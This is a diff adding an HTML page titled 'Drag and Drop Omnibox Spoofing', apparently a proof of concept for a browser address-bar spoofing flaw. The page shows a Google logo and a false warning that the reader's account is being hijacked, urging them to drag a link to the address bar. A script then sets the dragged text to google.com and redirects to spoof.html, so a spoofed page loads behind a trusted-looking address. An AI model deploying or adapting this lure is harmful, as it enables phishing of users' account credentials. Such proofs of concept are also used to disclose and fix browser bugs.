@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Drag and Drop Omnibox Spoofing</title>
+    <style>
+      #dragDiv {
+        margin-top: 35vh;
+        text-align: center;
+        cursor: move;
+        background-color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: "Courier New", Courier, monospace;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div
+      id="dragDiv"
+      draggable="true"
+      ondragstart="drag(event)"
+      style="display: flex; align-items: center"
+    >
+      <img
+        src="https://play-lh.googleusercontent.com/KwUBNPbMTk9jDXYS2AeX3illtVRTkrKVh5xR1Mg4WHd0CG2tV4mrh1z3kXi5z_warlk=w240-h480-rw"
+        style="height: 1.5em; margin-right: 0.5em"
+      />
+      <span
+        >Your account is being hijacked. Please verify your Google account by
+        dragging this link to the address bar.</span
+      >
+    </div>
+
+    <script>
+      function drag(ev) {
+        ev.dataTransfer.setData("text", "https://google.com");
+      }
+      function handleDragOver(event) {
+        setTimeout(() => {
+          location.href = "spoof.html";
+        }, 1000);
+      }
+      document.addEventListener("dragover", handleDragOver, false);
+    </script>
+  </body>
+</html>
